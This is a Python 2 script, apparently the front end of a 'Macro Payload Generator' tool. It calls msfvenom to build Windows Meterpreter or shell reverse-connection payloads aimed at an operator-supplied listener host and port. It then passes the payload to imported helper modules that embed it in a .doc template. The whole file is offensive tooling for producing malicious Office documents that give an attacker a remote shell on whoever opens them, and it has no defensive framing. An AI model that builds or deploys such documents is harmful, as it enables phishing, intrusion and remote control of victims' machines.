#!/usr/bin/python

import subprocess
import argparse
import os
from payload_gen import prepare_payload
from builder import depose_payload


lhost = "127.0.0.1"
lport = "80"

command = "msfvenom -p windows/meterpreter/reverse_http LHOST=" + lhost + " LPORT=" + lport + " -f raw -o payload.bin"
reverse_http = "windows/meterpreter/reverse_http"
reverse_tcp = "windows/meterpreter/reverse_tcp"

#print "Macro Payload Generator\n"

#payload = input("Payload :\n1 - meterpreter/reverse_http\n2 - meterpreter/reverse_tcp\n3 - shell/reverse_tcp\n4 - Custom binaries\n")
#inject = input("Injection method :\n1 - self inject\n2 - inject in process")

#print("Injection method :\n1 - Self Inject")
#print("Payload :\n1 - windows/meterpreter/reverse_http\n2 - windows/meterpreter/reverse_tcp\n3 - windows/shell_reverse_tcp\n4 - Custom binaries\n\n")

def menu():
	print """
	+------------------+----------------------------------+
	| Injection Method |             Payload              |
	+------------------+----------------------------------+
	|   Self-Inject    | windows/meterpreter/reverse_http |
	|                  | windows/meterpreter/reverse_tcp  |
	|                  | windows/shell_reverse_tcp        |
	+------------------+----------------------------------+

	"""

menu()

parser = argparse.ArgumentParser()
parser.add_argument("-p","--payload", help="Payload, -p 1, -p 2, ...",type=int,dest='payload',required=True)
parser.add_argument("-L","--lhost", help="IP or Domain of listener",type=str,dest='listener_ip',required=True)
parser.add_argument("-P","--lport", help="port of listener",type=str,dest='port',required=True)
parser.add_argument("-o","--output", help="Path to depose generated payload",type=str,dest='output',required=True)
args = parser.parse_args()

payload = args.payload
listener = args.listener_ip
port = args.port
output = args.output

#########################
# GENERATION OF PAYLOAD #
#########################
print "[!]Generation of payload"

prepare_payload(payload, listener, port)

##############################
# DEPOSE PAYLOAD IN TEMPLATE #
##############################
print "[!]Depose payload in template, use .doc file format"
depose_payload(output)

	


